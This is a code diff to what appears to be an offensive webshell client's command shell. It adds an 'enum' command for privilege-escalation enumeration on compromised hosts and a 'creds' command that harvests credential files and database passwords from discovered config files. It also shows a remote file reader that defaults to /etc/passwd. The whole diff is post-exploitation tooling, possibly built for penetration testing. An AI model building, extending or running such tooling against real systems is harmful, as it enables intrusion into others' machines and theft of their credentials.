@@ -22,7 +22,7 @@ from . import log
 from .config import Config
 from .core.webshell import WebShell
 from .exceptions import WebshellError
-from .features import database, files, inject, portscan, recon, revshell
+from .features import database, enum, files, inject, portscan, recon, revshell
 from .utils.network import get_ip_address
 
 BANNER = r"""
@@ -130,6 +130,27 @@ class Repl(cmd2.Cmd):
     def do_fsb(self, _: cmd2.Statement) -> None:
         """Find SUID-root binaries."""
         self._each(recon.find_suid_binaries, "suid")
+
+    def do_enum(self, _: cmd2.Statement) -> None:
+        """Aggregate privesc enumeration (id/sudo/cron/caps/world-writable/...)."""
+        def run(ws: WebShell) -> None:
+            for label, output in enum.enumerate_target(ws).items():
+                if output:
+                    log.success(f"== {label} ==")
+                    log.raw(output)
+        self._each(run, "enum")
+
+    def do_creds(self, _: cmd2.Statement) -> None:
+        """Harvest credential files and DB creds from discovered config files."""
+        def run(ws: WebShell) -> None:
+            configs = recon.find_config_files(ws)
+            found = enum.harvest_credentials(ws, configs)
+            if not found:
+                log.warning("No credentials found.")
+            for path, content in found.items():
+                log.success(f"== {path} ==")
+                log.raw(content)
+        self._each(run, "creds")
 
     def do_r(self, line: cmd2.Statement) -> None:
         """read <path> — read a remote file (default /etc/passwd)."""
@@ -398,7 +419,7 @@ class Repl(cmd2.Cmd):
 with contextlib.suppress(Exception):
     cmd2.categorize(
         [Repl.do_p, Repl.do_pv, Repl.do_kv, Repl.do_c, Repl.do_fwd,
-         Repl.do_fwpf, Repl.do_gdf, Repl.do_fsb],
+         Repl.do_fwpf, Repl.do_gdf, Repl.do_fsb, Repl.do_enum, Repl.do_creds],
         "Recon",
     )
     cmd2.categorize([Repl.do_r, Repl.do_rm, Repl.do_dl, Repl.do_dla, Repl.do_ul], "Files")
